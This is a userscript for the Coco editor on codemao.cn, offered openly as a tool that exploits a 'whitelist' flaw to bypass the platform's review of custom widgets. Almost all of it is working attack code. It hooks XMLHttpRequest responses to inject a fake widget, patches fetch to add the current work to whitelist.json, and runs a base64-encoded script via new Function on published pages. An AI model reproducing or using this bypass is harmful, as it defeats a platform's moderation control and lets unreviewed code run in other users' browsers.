		// ==UserScript==
// @name         Coco 绕过审核(whitelist漏洞)
// @namespace    http://lizilizzhh.top/
// @version      2024-06-19
// @description  使用whitelist漏洞绕过Coco对自定义控件的审核
// @author       Lizilizzhh
// @match        https://coco.codemao.cn/editor/*
// @match        https://coco.codemao.cn/editor/player/*
// @icon         https://coco.codemao.cn/favicon.ico
// @grant        none
// ==/UserScript==

(function () {
  //   "use strict";
  //   const originalOpen = XMLHttpRequest.prototype.open;
  //   XMLHttpRequest.prototype.open = function monkeyPatchedOpen(
  //     method,
  //     url,
  //     async,
  //     user,
  //     password
  //   ) {
  //     originalOpen.call(this, method, url, async, user, password);
  //     console.log(url, url.includes("/coconut/web/widget/list"));
  //     if (url.includes("/coconut/web/widget/list")) {
  //       this.addEventListener("readystatechange", function () {
  //         if (this.readyState === 4 && this.status === 200) {
  //           console.log(this);
  //           const clonedResponse = this.responseText;
  //           const modifiedResponse = `Modified response: ${clonedResponse}`;
  //           this.responseText = modifiedResponse;
  //         }
  //       });
  //     }
  //   };

  //   //   const originalSend = XMLHttpRequest.prototype.send;

  //   //   XMLHttpRequest.prototype.send = function monkeyPatchedSend(data) {
  //   //     originalSend.call(this, data);
  //   //   };

  let origin = XMLHttpRequest.prototype.open;

  XMLHttpRequest.prototype.__on_response = function (res) {
      if (
        this.responseURL.startsWith(
          "https://api-creation.codemao.cn/coconut/web/user/widget/list"
        )
      ) {
        let res_json = JSON.parse(res);
        res_json["data"]["items"].push({
          id: 114514,
          widget_name: "导入绕过审核",
          icon: "https://static.codemao.cn/coco/player/unstable/rJZhYkL32.image/jpeg?hash=FucXTDVfBJdoSStUZvqy24ILwabo",
          resource_url: getBypassWidgetUrl(),
          intro: "使用whitelist漏洞绕过Coco对自定义控件的审核",
          widget_code: "BYPASSCOCOUNSAFEWIDGET_CVE_WHITELIST_WIDGET",
          widget_type: 2,
        });
        console.log('hook in https://api-creation.codemao.cn/coconut/web/user/widget/list');
        let hooked_res = JSON.stringify(res_json);
        console.log('response ',hooked_res);
        return hooked_res;
      }
      return res;
    };

  var accessor = Object.getOwnPropertyDescriptor(
    XMLHttpRequest.prototype,
    "response"
  );

  Object.defineProperty(XMLHttpRequest.prototype, "response", {
    get: function () {
      let response = accessor.get.call(this);

      //在__on_response里修改你的response
      response = this.__on_response(response);

      return response;
    },
    set: function (str) {
      return accessor.set.call(this, str);
    },
    configurable: true,
  });
  Object.defineProperty(XMLHttpRequest.prototype, "responseText", {
    get: function () {
      let response = accessor.get.call(this);

      //在__on_response里修改你的response
      response = this.__on_response(response);

      return response;
    },
    set: function (str) {
      return accessor.set.call(this, str);
    },
    configurable: true,
  });
  function getBypassWidgetUrl() {
    return "data:text/plain;charset=UTF-8,const%20types%20%3D%20%7B%0A%20%20isInvisibleWidget%3A%20true%2C%0A%20%20type%3A%20%22BYPASSCOCOUNSAFEWIDGET_CVE_WHITELIST_WIDGET%22%2C%0A%20%20icon%3A%20%22icon-toolbox-featrue%22%2C%0A%20%20title%3A%20%22%E7%BB%95%E8%BF%87%E5%AE%A1%E6%A0%B8-whitelist%E6%BC%8F%E6%B4%9E%22%2C%0A%20%20version%3A%20%221.0.0%22%2C%0A%20%20isGlobalWidget%3A%20true%2C%0A%20%20properties%3A%20%5B%5D%2C%0A%20%20methods%3A%20%5B%5D%2C%0A%20%20events%3A%20%5B%5D%2C%0A%7D%3B%0A%0Aclass%20Widget%20extends%20InvisibleWidget%20%7B%0A%20%20constructor(props)%20%7B%0A%20%20%20%20super(props)%3B%0A%20%20%7D%0A%7D%0Aconst%20window_%20%3D%20new%20Function(%22return%20window%22)()%3B%0Aif%20(!window_.BYPASS_COCO_UNSAFE)%20%7B%0A%20%20%2F%2F%20%E4%BF%9D%E5%AD%98%E5%8E%9F%E5%A7%8B%E7%9A%84fetch%E5%87%BD%E6%95%B0%0A%20%20const%20originalFetch%20%3D%20window_.fetch%3B%0A%20%20function%20getQueryStringArgs()%20%7B%0A%20%20%20%20%2F%2F%E5%8F%96%E5%BE%97%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B9%B6%E5%8E%BB%E6%8E%89%E5%BC%80%E5%A4%B4%E7%9A%84%E9%97%AE%E5%8F%B7%0A%20%20%20%20var%20qs%20%3D%0A%20%20%20%20%20%20%20%20window_.location.search.length%20%3E%200%0A%20%20%20%20%20%20%20%20%20%20%3F%20window_.location.search.substring(1)%0A%20%20%20%20%20%20%20%20%20%20%3A%20%22%22%2C%0A%20%20%20%20%20%20%2F%2F%E4%BF%9D%E5%AD%98%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AF%B9%E8%B1%A1%0A%20%20%20%20%20%20args%20%3D%20%7B%7D%2C%0A%20%20%20%20%20%20%2F%2F%E5%8F%96%E5%BE%97%E6%AF%8F%E4%B8%80%E9%A1%B9%0A%20%20%20%20%20%20items%20%3D%20qs.length%20%3F%20qs.split(%22%26%22)%20%3A%20%5B%5D%2C%0A%20%20%20%20%20%20item%20%3D%20null%2C%0A%20%20%20%20%20%20name%20%3D%20null%2C%0A%20%20%20%20%20%20value%20%3D%20null%2C%0A%20%20%20%20%20%20%2F%2F%E5%9C%A8for%20%E5%BE%AA%E7%8E%AF%E4%B8%AD%E4%BD%BF%E7%94%A8%0A%20%20%20%20%20%20i%20%3D%200%2C%0A%20%20%20%20%20%20len%20%3D%20items.length%3B%0A%20%20%20%20%2F%2F%E9%80%90%E4%B8%AA%E5%B0%86%E6%AF%8F%E4%B8%80%E9%A1%B9%E6%B7%BB%E5%8A%A0%E5%88%B0args%20%E5%AF%B9%E8%B1%A1%E4%B8%AD%0A%20%20%20%20for%20(i%20%3D%200%3B%20i%20%3C%20len%3B%20i%2B%2B)%20%7B%0A%20%20%20%20%20%20item%20%3D%20items%5Bi%5D.split(%22%3D%22)%3B%0A%20%20%20%20%20%20name%20%3D%20decodeURIComponent(item%5B0%5D)%3B%0A%20%20%20%20%20%20value%20%3D%20decodeURIComponent(item%5B1%5D)%3B%0A%20%20%20%20%20%20if%20(name.length)%20%7B%0A%20%20%20%20%20%20%20%20args%5Bname%5D%20%3D%20value%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20return%20args%3B%0A%20%20%7D%0A%20%20%2F%2F%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84fetch%E5%87%BD%E6%95%B0%E6%9D%A5%E8%A6%86%E7%9B%96%E5%8E%9F%E5%A7%8B%E7%9A%84fetch%0A%20%20window_.fetch%20%3D%20function%20monkeyPatchedFetch(url%2C%20options)%20%7B%0A%20%20%20%20%2F%2F%20%E8%B0%83%E7%94%A8%E5%8E%9F%E5%A7%8B%E7%9A%84fetch%E5%87%BD%E6%95%B0%0A%20%20%20%20return%20originalFetch(url%2C%20options).then((response)%20%3D%3E%20%7B%0A%20%20%20%20%20%20%2F%2F%20%E5%85%8B%E9%9A%86%E5%93%8D%E5%BA%94%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9%E5%8E%9F%E5%A7%8B%E5%93%8D%E5%BA%94%0A%20%20%20%20%20%20const%20clonedResponse%20%3D%20response.clone()%3B%0A%0A%20%20%20%20%20%20%2F%2F%20%E6%A3%80%E6%9F%A5%E5%93%8D%E5%BA%94%E7%B1%BB%E5%9E%8B%EF%BC%8C%E4%BE%8B%E5%A6%82JSON%EF%BC%8C%E5%B9%B6%E6%A0%B9%E6%8D%AE%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9%0A%20%20%20%20%20%20if%20(%0A%20%20%20%20%20%20%20%20response.url.startsWith(%22https%3A%2F%2Fstatic.codemao.cn%2Fcoco%2Fwhitelist.json%22)%0A%20%20%20%20%20%20)%20%7B%0A%20%20%20%20%20%20%20%20return%20clonedResponse.json().then((data)%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%2F%2F%20%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%0A%20%20%20%20%20%20%20%20%20%20const%20args%20%3D%20getQueryStringArgs()%3B%0A%20%20%20%20%20%20%20%20%20%20let%20workId%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20if%20(args%5B%22workId%22%5D)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20console.log(%22in%20editor.%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20workId%20%3D%20Number(args%5B%22workId%22%5D)%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20console.log(%22not%20in%20editor.%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20workId%20%3D%20window_.location.href.substring(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20window_.location.href.lastIndexOf(%22%2F%22)%20%2B%201%0A%20%20%20%20%20%20%20%20%20%20%20%20)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20console.log(%22workId%20step%201.%22%2C%20workId)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(workId.includes(%22%3F%22))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20workId%20%3D%20Number(workId.substring(0%2C%20workId.indexOf(%22%3F%22)))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20console.log(%22workId%20step%202.%22%2C%20workId)%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20console.log(%22workId.%22%2C%20workId)%3B%0A%20%20%20%20%20%20%20%20%20%20data.push(workId)%3B%0A%20%20%20%20%20%20%20%20%20%20console.log(%22data%20changed%22%2C%20data)%3B%0A%20%20%20%20%20%20%20%20%20%20return%20new%20Response(JSON.stringify(data)%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20status%3A%20response.status%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20statusText%3A%20response.statusText%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20response.headers%2C%0A%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%2F%2F%20%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%98%AFJSON%E5%93%8D%E5%BA%94%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E5%8E%9F%E5%A7%8B%E5%93%8D%E5%BA%94%0A%20%20%20%20%20%20return%20response%3B%0A%20%20%20%20%7D)%3B%0A%20%20%7D%3B%0A%0A%20%20%2F%2F%20%E7%8E%B0%E5%9C%A8%EF%BC%8C%E6%89%80%E6%9C%89%E8%B0%83%E7%94%A8window_.fetch%E7%9A%84%E5%9C%B0%E6%96%B9%E9%83%BD%E4%BC%9A%E4%BD%BF%E7%94%A8%E6%88%91%E4%BB%AC%E7%9A%84%E7%8C%B4%E5%AD%90%E8%A1%A5%E4%B8%81%E7%89%88%E6%9C%AC%0A%20%20%2F%2F%20%E5%8F%91%E5%B8%83%E9%A1%B5%E4%B9%9F%E5%8F%AF%E4%BB%A5%EF%BC%81%EF%BC%81%EF%BC%81%0A%20%20if%20(window_.location.href.includes(%22%2Feditor%2Fplayer%2F%22))%20%7B%0A%20%20%20%20window_.document.body.classList%20%3D%20%5B%5D%3B%0A%0A%20%20%20%20new%20Function(%0A%20%20%20%20%20%20atob(%0A%20%20%20%20%20%20%20%20%22IWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQodCl7Zm9yKHZhciBuLG8sdT10WzBdLGk9dFsxXSxmPXRbMl0sbD0wLGQ9W107bDx1Lmxlbmd0aDtsKyspbz11W2xdLE9iamVjdC5wcm90b3R5cGUuaGFzT3duUHJvcGVydHkuY2FsbChhLG8pJiZhW29dJiZkLnB1c2goYVtvXVswXSksYVtvXT0wO2ZvcihuIGluIGkpT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGksbikmJihlW25dPWlbbl0pO2ZvcihzJiZzKHQpO2QubGVuZ3RoOylkLnNoaWZ0KCkoKTtyZXR1cm4gYy5wdXNoLmFwcGx5KGMsZnx8W10pLHIoKX1mdW5jdGlvbiByKCl7Zm9yKHZhciBlLHQ9MDt0PGMubGVuZ3RoO3QrKyl7Zm9yKHZhciByPWNbdF0sbj0hMCxvPTE7bzxyLmxlbmd0aDtvKyspe3ZhciBpPXJbb107MCE9PWFbaV0mJihuPSExKX1uJiYoYy5zcGxpY2UodC0tLDEpLGU9dSh1LnM9clswXSkpfXJldHVybiBlfXZhciBuPXt9LG89ezg6MH0sYT17ODowfSxjPVtdO2Z1bmN0aW9uIHUodCl7aWYoblt0XSlyZXR1cm4gblt0XS5leHBvcnRzO3ZhciByPW5bdF09e2k6dCxsOiExLGV4cG9ydHM6e319O3JldHVybiBlW3RdLmNhbGwoci5leHBvcnRzLHIsci5leHBvcnRzLHUpLHIubD0hMCxyLmV4cG9ydHN9dS5lPWZ1bmN0aW9uKGUpe3ZhciB0PVtdO29bZV0%2FdC5wdXNoKG9bZV0pOjAhPT1vW2VdJiZ7MTI6MX1bZV0mJnQucHVzaChvW2VdPW5ldyBQcm9taXNlKChmdW5jdGlvbih0LHIpe2Zvcih2YXIgbj0ic3RhdGljL2Nzcy8iKyh7fVtlXXx8ZSkrIi4iK3sxOiIzMWQ2Y2ZlMCIsMzoiMzFkNmNmZTAiLDEwOiIzMWQ2Y2ZlMCIsMTI6ImNjMzlhMjNmIiwxMzoiMzFkNmNmZTAiLDE0OiIzMWQ2Y2ZlMCIsMTU6IjMxZDZjZmUwIiwxNjoiMzFkNmNmZTAiLDE4OiIzMWQ2Y2ZlMCIsMTk6IjMxZDZjZmUwIn1bZV0rIi5jaHVuay5jc3MiLGE9dS5wK24sYz1kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgibGluayIpLGk9MDtpPGMubGVuZ3RoO2krKyl7dmFyIGY9KHM9Y1tpXSkuZ2V0QXR0cmlidXRlKCJkYXRhLWhyZWYiKXx8cy5nZXRBdHRyaWJ1dGUoImhyZWYiKTtpZigic3R5bGVzaGVldCI9PT1zLnJlbCYmKGY9PT1ufHxmPT09YSkpcmV0dXJuIHQoKX12YXIgbD1kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgic3R5bGUiKTtmb3IoaT0wO2k8bC5sZW5ndGg7aSsrKXt2YXIgcztpZigoZj0ocz1sW2ldKS5nZXRBdHRyaWJ1dGUoImRhdGEtaHJlZiIpKT09PW58fGY9PT1hKXJldHVybiB0KCl9dmFyIGQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGluayIpO2QucmVsPSJzdHlsZXNoZWV0IixkLnR5cGU9InRleHQvY3NzIixkLm9ubG9hZD10LGQub25lcnJvcj1mdW5jdGlvbih0KXt2YXIgbj10JiZ0LnRhcmdldCYmdC50YXJnZXQuc3JjfHxhLGM9bmV3IEVycm9yKCJMb2FkaW5nIENTUyBjaHVuayAiK2UrIiBmYWlsZWQuXG4oIituKyIpIik7Yy5jb2RlPSJDU1NfQ0hVTktfTE9BRF9GQUlMRUQiLGMucmVxdWVzdD1uLGRlbGV0ZSBvW2VdLGQucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChkKSxyKGMpfSxkLmhyZWY9YSxkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLmFwcGVuZENoaWxkKGQpfSkpLnRoZW4oKGZ1bmN0aW9uKCl7b1tlXT0wfSkpKTt2YXIgcj1hW2VdO2lmKDAhPT1yKWlmKHIpdC5wdXNoKHJbMl0pO2Vsc2V7dmFyIG49bmV3IFByb21pc2UoKGZ1bmN0aW9uKHQsbil7cj1hW2VdPVt0LG5dfSkpO3QucHVzaChyWzJdPW4pO3ZhciBjLGk9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7aS5jaGFyc2V0PSJ1dGYtOCIsaS50aW1lb3V0PTEyMCx1Lm5jJiZpLnNldEF0dHJpYnV0ZSgibm9uY2UiLHUubmMpLGkuc3JjPWZ1bmN0aW9uKGUpe3JldHVybiB1LnArInN0YXRpYy9qcy8iKyh7fVtlXXx8ZSkrIi4iK3sxOiI4YzMwZWQzNCIsMzoiYWRkMzlmMmMiLDEwOiJjMjgwNzU3ZSIsMTI6Ijg5YjNiNzk3IiwxMzoiODgzOTEwMTkiLDE0OiI1YThlODE2NyIsMTU6ImFlNTc2MmE1IiwxNjoiZTI3NjA1OWYiLDE4OiI4NGFkMmY4ZiIsMTk6IjI4NmU1Njc2In1bZV0rIi5jaHVuay5qcyJ9KGUpO3ZhciBmPW5ldyBFcnJvcjtjPWZ1bmN0aW9uKHQpe2kub25lcnJvcj1pLm9ubG9hZD1udWxsLGNsZWFyVGltZW91dChsKTt2YXIgcj1hW2VdO2lmKDAhPT1yKXtpZihyKXt2YXIgbj10JiYoImxvYWQiPT09dC50eXBlPyJtaXNzaW5nIjp0LnR5cGUpLG89dCYmdC50YXJnZXQmJnQudGFyZ2V0LnNyYztmLm1lc3NhZ2U9IkxvYWRpbmcgY2h1bmsgIitlKyIgZmFpbGVkLlxuKCIrbisiOiAiK28rIikiLGYubmFtZT0iQ2h1bmtMb2FkRXJyb3IiLGYudHlwZT1uLGYucmVxdWVzdD1vLHJbMV0oZil9YVtlXT12b2lkIDB9fTt2YXIgbD1zZXRUaW1lb3V0KChmdW5jdGlvbigpe2Moe3R5cGU6InRpbWVvdXQiLHRhcmdldDppfSl9KSwxMmU0KTtpLm9uZXJyb3I9aS5vbmxvYWQ9Yyxkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGkpfXJldHVybiBQcm9taXNlLmFsbCh0KX0sdS5tPWUsdS5jPW4sdS5kPWZ1bmN0aW9uKGUsdCxyKXt1Lm8oZSx0KXx8T2JqZWN0LmRlZmluZVByb3BlcnR5KGUsdCx7ZW51bWVyYWJsZTohMCxnZXQ6cn0pfSx1LnI9ZnVuY3Rpb24oZSl7InVuZGVmaW5lZCIhPXR5cGVvZiBTeW1ib2wmJlN5bWJvbC50b1N0cmluZ1RhZyYmT2JqZWN0LmRlZmluZVByb3BlcnR5KGUsU3ltYm9sLnRvU3RyaW5nVGFnLHt2YWx1ZToiTW9kdWxlIn0pLE9iamVjdC5kZWZpbmVQcm9wZXJ0eShlLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KX0sdS50PWZ1bmN0aW9uKGUsdCl7aWYoMSZ0JiYoZT11KGUpKSw4JnQpcmV0dXJuIGU7aWYoNCZ0JiYib2JqZWN0Ij09dHlwZW9mIGUmJmUmJmUuX19lc01vZHVsZSlyZXR1cm4gZTt2YXIgcj1PYmplY3QuY3JlYXRlKG51bGwpO2lmKHUucihyKSxPYmplY3QuZGVmaW5lUHJvcGVydHkociwiZGVmYXVsdCIse2VudW1lcmFibGU6ITAsdmFsdWU6ZX0pLDImdCYmInN0cmluZyIhPXR5cGVvZiBlKWZvcih2YXIgbiBpbiBlKXUuZChyLG4sZnVuY3Rpb24odCl7cmV0dXJuIGVbdF19LmJpbmQobnVsbCxuKSk7cmV0dXJuIHJ9LHUubj1mdW5jdGlvbihlKXt2YXIgdD1lJiZlLl9fZXNNb2R1bGU%2FZnVuY3Rpb24oKXtyZXR1cm4gZS5kZWZhdWx0fTpmdW5jdGlvbigpe3JldHVybiBlfTtyZXR1cm4gdS5kKHQsImEiLHQpLHR9LHUubz1mdW5jdGlvbihlLHQpe3JldHVybiBPYmplY3QucHJvdG90eXBlLmhhc093blByb3BlcnR5LmNhbGwoZSx0KX0sdS5wPSJodHRwczovL2NyZWF0aW9uLmNvZGVtYW8uY24vY29jb251dC93ZWIvMS4yMi4wLTAvIix1Lm9lPWZ1bmN0aW9uKGUpe3Rocm93IGNvbnNvbGUuZXJyb3IoZSksZX07dmFyIGk9dGhpcy53ZWJwYWNrSnNvbnBhcHBjcmFmdD10aGlzLndlYnBhY2tKc29ucGFwcGNyYWZ0fHxbXSxmPWkucHVzaC5iaW5kKGkpO2kucHVzaD10LGk9aS5zbGljZSgpO2Zvcih2YXIgbD0wO2w8aS5sZW5ndGg7bCsrKXQoaVtsXSk7dmFyIHM9ZjtyKCl9KFtdKQ%3D%3D%22%0A%20%20%20%20%20%20)%0A%20%20%20%20)()%3B%0A%20%20%7D%0A%20%20window_.BYPASS_COCO_UNSAFE%20%3D%20true%3B%0A%7D%0Aexports.types%20%3D%20types%3B%0Aexports.widget%20%3D%20Widget%3B%0A%2F%2F";
  }
})();